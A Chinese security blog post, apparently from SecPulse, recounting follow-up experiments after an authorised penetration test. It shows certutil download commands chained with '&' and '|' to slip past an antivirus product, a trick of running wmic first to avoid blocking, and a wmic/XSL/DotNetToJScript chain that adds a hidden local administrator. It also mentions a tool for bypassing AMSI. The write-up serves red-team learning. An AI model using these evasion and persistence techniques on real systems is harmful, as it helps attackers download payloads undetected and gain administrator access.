记⼀次渗透测试后引发的
⼩扩展 安
- SecPulse.COM |
全脉搏
“ 这是 酒仙桥六号部队 的第 122 篇⽂
章。
这是 酒仙桥六号部队 的第 122 篇⽂章。
全⽂共计 2205 个字，预计阅读时⻓ 7 分钟。
背景
在⼀次授权的渗透测试中，由于使⽤客户提供的机器进⾏
测试操作，⼀开始通过弱⼝令的爆破 + 上传⽂件拿到
shell，但是由于客户要求点到为⽌就没有深⼊进⾏，但
是发现了安全软件为某杀软，突然⼼⾎来潮想要执⾏远程
下载⽂件还是受到了拦截，以下是对遇到的场景后期搭建
环境进⾏实现的⼀些⼩拓展，仅供参考~~~
正⽂
安装某杀软并更新⾄最新版本，并检查防护中⼼为全开启
的状态，随后在 cmd 命令⾏下使⽤ certutil 时候，发⽣
如下拦截：
在尝试了⼀些变形之后下之后发现了如下可以绕过的语
句。
发现使⽤ & 和 | 也可以顺利绕过并下载。当然后续要想
实现上线需要对该 exe 做免杀处理，这⾥只是分享绕过
下载的⽅式，相信免杀的绕过对于各位⼤佬来说也不是什
么难事~~~
Certutil & Certutil –urlcache –f –split url
Certutil | Certutil –urlcache –f –split url
经过后续的测试发现也可以先执⾏⼀次 certutil 再执⾏原
始的下载语句即可绕过，便可以看到 2.exe 已经被下
载。
其实想想使⽤的符号 & 和 |，本质都是执⾏了 2 次
certutil~
Wmic ⽅式可以看到⼀开始也是被拦截，如下所示：
在后续的测试变形中发现先执⾏ wmic os，然后执⾏正
常的命令即可绕过，如下所示：
对于 wmic 的绕过也可以先执⾏ wmic 然后 exit 退出，
然后继续执⾏原始的下载命令即可，当然 wmic 也有其
他⽅式可以进⾏绕过这⾥不展开介绍。
⼩扩展
下⾯介绍⼀个⼩的利⽤⽅式添加⽤户，其余⽩名单执⾏和
利⽤⽅式可以⾃⾏研究~。这种调⽤的⽅式最早应该是由
Casey Smith@subTee ⼤佬分享⼀个技巧，利⽤ wmic
从本地或者远程调⽤ xsl 的⽅式来执⾏携带有 payload
的 xsl ⽂件。
⾸先 net user 查看⽤户只有 2 个⽤户如下：
⾸先执⾏ wmic os。
然后再次执⾏ wmic os get 下载命令即可成功添加，此
时未有拦截，如下所示：
当然，添加⽤户到到管理员组需要管理员权限，所以我在
这⾥⽤了本地的管理员进⾏的执⾏，脚本主要是调⽤了
windows 的 2 个 api 函数进⾏创建⽤户和添加管理员
组，分别为：
NetUserAdd
NetLocalGroupAddMembers
可能有⼈会问到 xsl ⽂件怎么执⾏的添加⽤户到管理员，
因为这个整个流程是先将添加⽤户的 c# 脚本先转化为
dll ⽂件，然后使⽤ DotNetToJScript 将该 dll ⽂件转为
为 js，最后将转化为的 js ⽂件放在要落地执⾏的 xsl ⽂
件⾥⾯。对于 c# 语⾔或者 c++ 语⾔调⽤ windows api
添加⽤户⾄管理员组⽹上已经有很多代码，拿过来改改就
⾏。然后使⽤ Visual Studio 的开发者⼯具将 c# ⽂件转
化为 dll ⽂件。
语法：csc /target:library /out: 输出⽂件 待转化的 c#
⽂件
然后使⽤ DotNetToJScript 将⽂件转化为 js 脚本⽂件
（DotNetToJScript 这个⼯具是由 17 年 James
Forshaw 开源了⼀个⼯具 DotNetToJScript，能够利⽤
JS、Vbs 等脚本加载. Net 程序。）转化语法也⽐较简
单。如下所示：
可以看出直接 DotNetToJScript –o 待输出 js ⽂件 待转
化⽂件。（但是该⼯具不能够绕过 windwos 的 amsi 检
测机制，如果要想绕过该防护可以使⽤另外⼀个⼯具
GadgetToJScript(https://github.com/med0x2e/Gadg
etToJScript）
来看下 DotNetToJScript ⼯具转化后的 js ⽂件如下图所
示：
处理流程⼤概是就是 js 通过调⽤⼀些 windwos api 的函
数来对前⾯ base64 编码过后的代码进⾏解码，然后解
码过后进⾏反序列化操作，因为⼯具是先序列化然后再
base64 编码。最后把⽂件写⼊ xsl ⽂件定义为 Jscript
语⾔，借助. net 环境来实现代码功能。绕过之后貌似不
再拦截原始的下载命令，但是需要退出该杀软才可以再次
拦截原始的 certutil 或者 wmic 命令，（有的时候即使退
出再重新开启也不会拦截）即使再次进⼊拦截，通过上述
⽅法继续可以执⾏下载。
对于调⽤ windows api 绕过部分杀软添加管理员也是⽼
⽣常谈了，也可以修改为接收参数的⽅式进⾏，把写好的
⽂件编译为 exe 即可使⽤，相信聪明的你应该知道怎么
做了~~~
绕过并添加到管理员组：
总结
遇到杀软不要害怕，要对当前的利⽤场景进⾏分析，有条
件的可以搭建环境测试⼀下，结合之前前辈们提出的利⽤
⽅式进⾏思维发散，总之站在巨⼈的肩膀上还是有不少收
获的。
参考⽂章：
[https://3gstudent.github.io/3gstudent.github.io/%E5%8
https://www.cnblogs.com/zpchcbd/p/11915654.html
本⽂作者： 酒仙桥六号部队
本⽂为安全脉搏专栏作者发布，转载请注明：
https://www.secpulse.com/archives/148945.html
全⽂完
本⽂由 简悦 SimpRead 优化，⽤以提升阅读体验
使⽤了 全新的简悦词法分析引擎 beta，点击查看详细说明